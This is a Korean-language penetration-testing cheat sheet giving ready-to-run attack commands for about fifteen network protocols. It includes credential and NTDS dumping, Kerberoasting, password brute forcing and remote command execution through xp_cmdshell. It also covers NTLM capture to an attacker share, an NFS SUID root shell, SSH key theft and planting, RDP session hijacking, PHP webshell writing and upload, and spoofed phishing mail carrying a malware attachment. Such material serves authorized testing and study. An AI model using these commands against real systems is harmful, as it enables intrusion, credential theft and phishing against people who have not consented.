# 프로토콜별 명령어

---

| 프로토콜 | 포트 | 핵심 명령어 |
|---------|------|-----------|
| SMB | 445 | `nxc smb IP -u USER -p PASS --shares` |
| LDAP | 389 | `ldapsearch -x -H ldap://IP -D 'user@domain' -w PASS -b 'DC=x,DC=y'` |
| Kerberos | 88 | `kerbrute userenum -d DOMAIN --dc DC users.txt` |
| WinRM | 5985 | `evil-winrm -i IP -u USER -H HASH` |
| RDP | 3389 | `xfreerdp /v:IP /u:USER /p:PASS /cert-ignore` |
| SSH | 22 | `ssh -i id_rsa user@IP` |
| MSSQL | 1433 | `impacket-mssqlclient DOMAIN/USER:PASS@IP` |
| FTP | 21 | `ftp IP` (anonymous:) |
| DNS | 53 | `dig axfr DOMAIN @DNS` |
| SMTP | 25 | `smtp-user-enum -M VRFY -U users.txt -t IP` |
| SNMP | 161 | `snmpwalk -v2c -c public IP` |
| RPC | 135 | `rpcclient -N -U '' IP` → `enumdomusers` |
| NFS | 2049 | `showmount -e IP` → `mount -t nfs IP:/share /mnt` |
| MySQL | 3306 | `mysql -h IP -u root -p` |
| HTTP | 80/443 | `whatweb URL` / `ffuf -u URL/FUZZ -w wordlist` |

---

## SMB (445)

```bash
# 열거
nxc smb IP -u USER -p PASS --shares
nxc smb IP -u USER -p PASS --users
nxc smb IP -u USER -p PASS --rid-brute
smbclient //IP/SHARE -U 'USER%PASS'
smbmap -u USER -p PASS -H IP

# Null Session
smbclient -L IP -N
rpcclient -N -U '' IP -c 'enumdomusers'

# SMB Signing 확인 (NTLM Relay 조건)
nxc smb SUBNET/24 --gen-relay-list targets.txt

# 명령 실행
nxc smb IP -u admin -p PASS -x "whoami"
impacket-psexec DOMAIN/USER:PASS@IP

# 덤프
nxc smb IP -u admin -p PASS --sam
nxc smb IP -u admin -p PASS --lsa
nxc smb IP -u admin -p PASS --ntds           # DC
```

## LDAP (389/636)

```bash
# Anonymous
ldapsearch -x -H ldap://IP -b "DC=domain,DC=local"

# 인증
ldapsearch -x -H ldap://IP -D "user@domain" -w PASS \
  -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description

# AS-REP / Kerberoast
nxc ldap DC -u USER -p PASS --asreproast output.txt
nxc ldap DC -u USER -p PASS --kerberoasting output.txt
```

## Kerberos (88)

```bash
# 사용자 열거
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# AS-REP Roasting
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -no-pass

# Kerberoasting
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request
```

## MSSQL (1433)

```bash
impacket-mssqlclient DOMAIN/USER:PASS@IP

# 명령 실행
EXEC xp_cmdshell 'whoami';
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;     # 활성화

# NTLM 캡처
EXEC xp_dirtree '\\ATTACKER\share';

# 링크드 서버
SELECT * FROM openquery("LINKED", 'SELECT @@servername');
EXEC ('xp_cmdshell ''whoami''') AT [LINKED];
```

## WinRM (5985)

```bash
evil-winrm -i IP -u USER -p PASS
evil-winrm -i IP -u USER -H NTHASH
nxc winrm IP -u USER -p PASS -x "whoami"
```

## SSH (22)

```bash
ssh user@IP
ssh -i id_rsa user@IP

# 브루트포스
hydra -l user -P rockyou.txt ssh://IP
nxc ssh IP -u users.txt -p passwords.txt
```

## DNS (53)

```bash
dig axfr DOMAIN @DNS_SERVER
dig any DOMAIN @DNS_SERVER
gobuster dns -d DOMAIN -w subdomains.txt -t 50
```

## RPC (135)

```bash
rpcclient -N -U '' IP                         # Null Session
rpcclient -U 'USER%PASS' IP

# 열거
enumdomusers
enumdomgroups
queryuser 0x1f4                                # RID 500 = Administrator
querydispinfo

# SID 열거
impacket-lookupsid DOMAIN/USER:PASS@IP
```

---

## FTP (21)

```bash
# 배너 및 Anonymous 확인
nmap -sV -sC -p 21 TARGET
nmap --script=ftp-anon,ftp-vsftpd-backdoor -p 21 TARGET

# Anonymous 접속
ftp TARGET
> Name: anonymous
> Password:
ftp> ls -la
ftp> binary                                    # 바이너리 모드
ftp> get filename
ftp> mget *

# 재귀 다운로드
wget -m ftp://anonymous:@TARGET/

# 브루트포스
hydra -l user -P passwords.txt ftp://TARGET -t 10

# 쓰기 가능 시 웹쉘 업로드 (웹루트 연결된 경우)
ftp> put webshell.php

# 알려진 취약점
# vsFTPd 2.3.4 - 포트 6200 백도어
# ProFTPd 1.3.3c mod_copy
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
```

---

## NFS (2049)

```bash
# 공유 확인
showmount -e TARGET
nmap --script=nfs-ls,nfs-showmount,nfs-statfs -p 2049 TARGET

# 마운트
mkdir /tmp/nfs
mount -t nfs TARGET:/share /tmp/nfs
mount -t nfs -o nolock,vers=3 TARGET:/share /tmp/nfs

# no_root_squash → SUID 배치
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
# 타겟에서: /share/bash -p → root 쉘

# UID 스푸핑
ls -ln /tmp/nfs/                               # 소유자 UID 확인
useradd -u 1001 fakeuser                       # 동일 UID 사용자 생성
su - fakeuser && cat /tmp/nfs/sensitive_file

# SSH 키 탈취/배치
cat /tmp/nfs/home/user/.ssh/id_rsa
echo "PUBKEY" >> /tmp/nfs/home/user/.ssh/authorized_keys
```

---

## SNMP (161)

```bash
# Community String 열거
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET

# 전체 MIB 덤프
snmpwalk -v2c -c public TARGET
snmp-check TARGET -c public

# 주요 OID
snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25    # Windows 사용자
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2   # 실행 중인 프로세스
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.6.13.1.3     # TCP 열린 포트
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.6.3.1.2   # 설치된 소프트웨어

# SNMPv3
snmpwalk -v3 -l authPriv -u USER -a SHA -A AUTH_PASS -x AES -X PRIV_PASS TARGET

# Nmap
nmap --script=snmp-info,snmp-processes,snmp-win32-users -sU -p 161 TARGET
```

---

## RDP (3389)

```bash
# 열거
nmap -sV -sC -p 3389 TARGET
nmap --script=rdp-enum-encryption,rdp-ntlm-info -p 3389 TARGET

# 접속
xfreerdp /v:TARGET /u:USER /p:PASS /cert-ignore /dynamic-resolution
xfreerdp /v:TARGET /u:USER /pth:NTHASH /cert-ignore      # PTH (Restricted Admin)
xfreerdp /v:TARGET /u:USER /p:PASS /cert-ignore +clipboard /drive:share,/tmp

# 브루트포스
hydra -l user -P passwords.txt rdp://TARGET -t 4
nxc rdp TARGET -u users.txt -p 'Password1!' --continue-on-success

# Restricted Admin 원격 활성화
nxc smb TARGET -u admin -H HASH -x "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"

# Session Hijacking (SYSTEM 권한)
query user
tscon SESSION_ID /dest:rdp-tcp#0
```

---

## SMTP (25)

```bash
# 열거
nmap -sV -sC -p 25,465,587 TARGET
nmap --script=smtp-commands,smtp-ntlm-info -p 25 TARGET

# 사용자 열거
smtp-user-enum -M VRFY -U users.txt -t TARGET
smtp-user-enum -M RCPT -U users.txt -t TARGET -D domain.com

# Open Relay 확인
nmap --script=smtp-open-relay -p 25 TARGET

# 메일 전송 (스푸핑)
swaks --to victim@domain.com --from ceo@domain.com --server TARGET \
  --header "Subject: Urgent" --body "Click here"
swaks --to victim@domain.com --from ceo@domain.com --server TARGET \
  --header "Subject: Invoice" --attach @malware.docx
```

---

## MySQL (3306)

```bash
# 접속
mysql -h TARGET -u root -p
mysql -h TARGET -u root --password=''          # 빈 암호

# 브루트포스
hydra -l root -P passwords.txt mysql://TARGET

# 정보 수집
SELECT VERSION();
SELECT USER();
SHOW GRANTS;
SELECT user, host, authentication_string FROM mysql.user;
```

```sql
-- 파일 읽기 (FILE 권한)
SELECT LOAD_FILE('/etc/passwd');
SHOW VARIABLES LIKE 'secure_file_priv';

-- 웹쉘 쓰기
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- UDF 권한 상승 (root 실행 시)
SHOW VARIABLES LIKE 'plugin_dir';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('whoami');
```

---

## HTTP (80/443)

```bash
# 기술 스택
whatweb http://TARGET
curl -s -I http://TARGET
wafw00f http://TARGET                          # WAF 탐지

# 디렉토리 열거
feroxbuster -u http://TARGET -w wordlist -t 50 -d 2 -x php,asp,aspx
gobuster dir -u http://TARGET -w wordlist -t 50 -x php,txt,bak

# 가상 호스트
ffuf -u http://TARGET -H "Host: FUZZ.domain.com" -w subdomains.txt -fs SIZE
gobuster vhost -u http://TARGET -w subdomains.txt --append-domain

# API 엔드포인트
ffuf -u http://TARGET/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
ffuf -u http://TARGET/api/v1/FUZZ -w wordlist -mc 200,401,403

# 숨겨진 파일
curl http://TARGET/robots.txt
curl http://TARGET/sitemap.xml
curl http://TARGET/.git/HEAD
curl http://TARGET/.env
curl http://TARGET/wp-config.php.bak

# Nikto
nikto -h http://TARGET

# SSL/TLS
sslscan TARGET
testssl.sh TARGET
```
